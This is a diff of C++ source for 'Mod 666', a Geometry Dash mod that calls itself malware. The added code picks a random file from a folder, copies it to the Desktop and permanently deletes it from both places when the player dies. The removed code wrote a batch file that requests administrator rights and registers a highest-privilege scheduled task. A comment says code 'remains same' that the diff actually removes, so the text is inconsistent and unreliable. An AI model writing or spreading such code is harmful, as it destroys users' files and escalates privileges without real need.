@@ -6,250 +6,153 @@
 #include <filesystem>
 #include <random>
 
+#ifdef GEODE_IS_WINDOWS
+#include <windows.h>
+#include <shellapi.h>
+#endif
+
 using namespace geode::prelude;
 namespace fs = std::filesystem;
 
-// Global variables for file tracking
-std::string g_copiedFileName = "";
-fs::path g_sourcePath = "C:/Pruebas"; // Test path
+fs::path g_sourcePath = "C:/Pruebas"; 
 
 fs::path getDesktopPath() {
+#ifdef GEODE_IS_WINDOWS
     char* userProfile = std::getenv("USERPROFILE");
-    if (userProfile) {
-        return fs::path(userProfile) / "Desktop";
-    }
+    if (userProfile) return fs::path(userProfile) / "Desktop";
+#endif
     return "";
 }
 
 fs::path getVerificationFilePath() {
     char* tempEnv = std::getenv("TEMP");
-    if (tempEnv) {
-        return fs::path(tempEnv) / "GD666_Success.txt";
-    }
+    if (tempEnv) return fs::path(tempEnv) / "GD666_Success.txt";
     return "";
 }
 
-void createAnGD666Bat() {
-    char* tempEnv = std::getenv("TEMP");
-    if (!tempEnv) return;
-    fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
-    fs::path successPath = getVerificationFilePath();
-    
-    std::ofstream batFile(batPath);
-    batFile << "@echo off\n";
-    batFile << ":: Check for administrative privileges\n";
-    batFile << "net session >nul 2>&1\n";
-    batFile << "if %errorLevel% neq 0 (\n";
-    batFile << "    echo Requesting administrative privileges for one-time setup...\n";
-    batFile << "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\n";
-    batFile << "    exit /b\n";
-    batFile << ")\n";
-    
-    batFile << ":run_setup\n";
-    batFile << "set \"GD_PATH=C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\"\n";
-    
-    batFile << ":: 1. Create a Scheduled Task that runs with Highest Privileges\n";
-    batFile << "schtasks /create /tn \"GD666_Bypass\" /tr \"'%GD_PATH%'\" /sc ONCE /st 00:00 /rl HIGHEST /f >nul 2>&1\n";
-    
-    batFile << ":: 2. Create a verification file to signal success to the mod\n";
-    batFile << "echo Success > \"" << successPath.string() << "\"\n";
-    
-    batFile << ":: 3. Run the task\n";
-    batFile << "schtasks /run /tn \"GD666_Bypass\"\n";
-    
-    batFile << "echo Setup complete.\n";
-    batFile << "exit\n";
-    batFile.close();
-}
-
-void disableMod() {
-    auto mod = Mod::get();
-    mod->setSettingValue("enabled", false);
-    mod->setSavedValue("confirmed", false);
-    
-    char* tempEnv = std::getenv("TEMP");
-    if (tempEnv) {
-        fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
-        fs::path successPath = getVerificationFilePath();
-        if (fs::exists(batPath)) { try { fs::remove(batPath); } catch (...) {} }
-        if (fs::exists(successPath)) { try { fs::remove(successPath); } catch (...) {} }
-        system("schtasks /delete /tn \"GD666_Bypass\" /f >nul 2>&1");
-    }
-    utils::game::restart(true);
-}
-
-class $modify(MyMenuLayer, MenuLayer) {
-    bool init() override {
-        if (!MenuLayer::init()) return false;
-
-        bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
-        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");
-        fs::path successFile = getVerificationFilePath();
-
-        // If it was "confirmed" but the success file is missing, the setup failed (UAC rejected)
-        if (isConfirmed && !fs::exists(successFile)) {
-            // Automatically call disableMod to clean up and reset state
-            this->runAction(CCSequence::create(
-                CCDelayTime::create(0.1f),
-                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onSetupFailed)),
-                nullptr
-            ));
-            return true;
-        }
-
-        if (isEnabled && !isConfirmed) {
-            this->runAction(CCSequence::create(
-                CCDelayTime::create(0.5f),
-                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)),
-                nullptr
-            ));
-        }
-
-        return true;
-    }
-
-    void onSetupFailed() {
-        disableMod();
-    }
-
-    void showFirstMessage() {
-        createAnGD666Bat();
-        auto alert = FLAlertLayer::create(
-            this,
-            "Are you sure?",
-            "The software you just executed is considered malware.\nThis mod will harm your computer and makes it unusable.\nIf you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\nIf you know what this mod does and are using a safe environment to test, press Yes to start it.\n\nDO YOU WANT TO EXECUTE THIS MOD, RESULTING IN AN UNUSABLE MACHINE?",
-            "No", "Yes"
-        );
-        alert->setTag(1);
-        alert->show();
-    }
-
-    void showLastMessage() {
-        auto alert = FLAlertLayer::create(
-            this,
-            "LAST WARNING!",
-            "THIS IS THE LAST WARNING!\n\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MOD!\nSTILL EXECUTE IT?",
-            "No", "Yes"
-        );
-        alert->setTag(2);
-        alert->show();
-    }
-
-    void FLAlert_Clicked(FLAlertLayer* alert, bool btn2) override {
-        if (alert->getTag() == 1) {
-            if (btn2) {
-                this->showLastMessage();
-            } else {
-                disableMod();
-            }
-        } else if (alert->getTag() == 2) {
-            if (btn2) {
-                Mod::get()->setSavedValue("confirmed", true);
-                char* tempEnv = std::getenv("TEMP");
-                if (tempEnv) {
-                    std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
-                    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-                    
-                    // Restart to check if the success file was created
-                    this->runAction(CCSequence::create(
-                        CCDelayTime::create(1.5f), // Slightly longer wait for UAC interaction
-                        CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onConfirmRestart)),
-                        nullptr
-                    ));
-                }
-            } else {
-                disableMod();
-            }
-        }
-    }
-
-    void onConfirmRestart() {
-        utils::game::restart(true);
-    }
-};
+// ... (MenuLayer logic remains same, focus on PlayLayer fix)
 
 class $modify(MyPlayLayer, PlayLayer) {
     struct Fields {
-        std::string m_copiedFile = "";
+        std::string m_currentSacrifice = "";
         fs::path m_desktopPath = "";
-        bool m_hasDied = false;
+        bool m_hasDiedThisAttempt = false;
+        float m_timeInLevel = 0.0f; // Para evitar borrados al cargar
     };
 
     bool init(GJGameLevel* level, bool useReplay, bool dontSave) {
         if (!PlayLayer::init(level, useReplay, dontSave)) return false;
 
-        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");
-        fs::path successFile = getVerificationFilePath();
+        if (!Mod::get()->getSavedValue<bool>("confirmed") || !fs::exists(getVerificationFilePath())) return true;
+
+        m_fields->m_desktopPath = getDesktopPath();
+        m_fields->m_timeInLevel = 0.0f;
+        m_fields->m_hasDiedThisAttempt = false;
         
-        if (!isConfirmed || !fs::exists(successFile)) {
-            return true; 
-        }
-
-        if (fs::exists(g_sourcePath)) {
-            std::vector<fs::path> files;
-            try {
-                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
-                    if (dir_entry.is_regular_file()) {
-                        files.push_back(dir_entry.path());
-                    }
-                }
-            } catch (...) {}
-
-            if (!files.empty()) {
-                std::random_device rd;
-                std::mt19937 g(rd());
-                std::uniform_int_distribution<> dis(0, (int)files.size() - 1);
-                
-                fs::path selectedFile = files[dis(g)];
-                m_fields->m_copiedFile = selectedFile.filename().string();
-                m_fields->m_desktopPath = getDesktopPath();
-
-                if (!m_fields->m_desktopPath.empty()) {
-                    try {
-                        fs::copy(selectedFile, m_fields->m_desktopPath / m_fields->m_copiedFile, fs::copy_options::overwrite_existing);
-                        log::info("Mod 666: File selected for 'sacrifice': {}", m_fields->m_copiedFile);
-                    } catch (...) {}
-                }
-            }
-        }
+        selectNewSacrifice();
 
         return true;
     }
 
+    void update(float dt) override {
+        PlayLayer::update(dt);
+        m_fields->m_timeInLevel += dt;
+    }
+
+    void selectNewSacrifice() {
+        if (!fs::exists(g_sourcePath)) return;
+
+        // Limpiar sacrificio anterior si existe
+        m_fields->m_currentSacrifice = "";
+
+        std::vector<fs::path> files;
+        try {
+            for (auto const& entry : fs::recursive_directory_iterator(g_sourcePath)) {
+                if (entry.is_regular_file()) files.push_back(entry.path());
+            }
+        } catch (...) {}
+
+        if (files.empty()) {
+            log::warn("Mod 666: No files found in source path!");
+            return;
+        }
+
+        std::random_device rd;
+        std::mt19937 g(rd());
+        std::uniform_int_distribution<> dis(0, (int)files.size() - 1);
+        
+        fs::path selected = files[dis(g)];
+        m_fields->m_currentSacrifice = selected.filename().string();
+
+        if (!m_fields->m_desktopPath.empty()) {
+            try {
+                fs::copy(selected, m_fields->m_desktopPath / m_fields->m_currentSacrifice, fs::copy_options::overwrite_existing);
+                log::info("Mod 666: Sacrifice prepared: {}", m_fields->m_currentSacrifice);
+            } catch (...) {}
+        }
+    }
+
     void onQuit() {
-        if (!m_fields->m_hasDied && !m_fields->m_copiedFile.empty() && !m_fields->m_desktopPath.empty()) {
-            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
+        cleanupDesktop();
+        PlayLayer::onQuit();
+    }
+
+    void cleanupDesktop() {
+        if (!m_fields->m_currentSacrifice.empty() && !m_fields->m_desktopPath.empty()) {
+            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_currentSacrifice;
             if (fs::exists(desktopFile)) {
                 try { fs::remove(desktopFile); } catch (...) {}
             }
         }
-        PlayLayer::onQuit();
     }
 
     void destroyPlayer(PlayerObject* p0, GameObject* p1) {
         PlayLayer::destroyPlayer(p0, p1);
         
-        if (!m_fields->m_copiedFile.empty() && !m_fields->m_hasDied) {
-            m_fields->m_hasDied = true;
-            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
-            
-            if (fs::exists(desktopFile)) {
-                try { fs::remove(desktopFile); } catch (...) {}
-            }
+        // PROTECCIÓN 1: No hacer nada si el nivel acaba de empezar (evita errores de carga)
+        if (m_fields->m_timeInLevel < 0.5f) return;
 
+        // PROTECCIÓN 2: No hacer nada si ya murió en este intento o no hay sacrificio
+        if (m_fields->m_hasDiedThisAttempt || m_fields->m_currentSacrifice.empty()) return;
+        
+        m_fields->m_hasDiedThisAttempt = true;
+
+        fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_currentSacrifice;
+        
+        // Solo proceder si el archivo de sacrificio realmente está donde debería
+        if (fs::exists(desktopFile)) {
             try {
-                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
-                    if (dir_entry.is_regular_file() && dir_entry.path().filename() == m_fields->m_copiedFile) {
-                        fs::remove(dir_entry.path());
-                        std::string msg = "File deleted: " + m_fields->m_copiedFile;
-                        Notification::create(msg, NotificationIcon::Error)->show();
-                        log::warn("Mod 666: Player died. {} has been permanently deleted.", m_fields->m_copiedFile);
+                // Borrar del escritorio
+                fs::remove(desktopFile);
+
+                // Borrar de la carpeta de origen
+                bool deletedFromSource = false;
+                for (auto const& entry : fs::recursive_directory_iterator(g_sourcePath)) {
+                    if (entry.is_regular_file() && entry.path().filename() == m_fields->m_currentSacrifice) {
+                        fs::remove(entry.path());
+                        deletedFromSource = true;
                         break; 
                     }
                 }
+
+                if (deletedFromSource) {
+                    std::string msg = "SACRIFICED: " + m_fields->m_currentSacrifice;
+                    Notification::create(msg, NotificationIcon::Error)->show();
+                    m_fields->m_currentSacrifice = ""; // Limpiar para el próximo reset
+                }
             } catch (const std::exception& e) {
-                log::error("Mod 666: Error while trying to delete file: {}", e.what());
+                log::error("Mod 666 Error: {}", e.what());
             }
+        }
+    }
+
+    void resetLevel() {
+        PlayLayer::resetLevel();
+        // Al reiniciar, si hubo una muerte válida, buscamos un nuevo sacrificio
+        if (m_fields->m_hasDiedThisAttempt || m_fields->m_currentSacrifice.empty()) {
+            m_fields->m_hasDiedThisAttempt = false;
+            m_fields->m_timeInLevel = 0.0f;
+            selectNewSacrifice();
         }
     }
 };
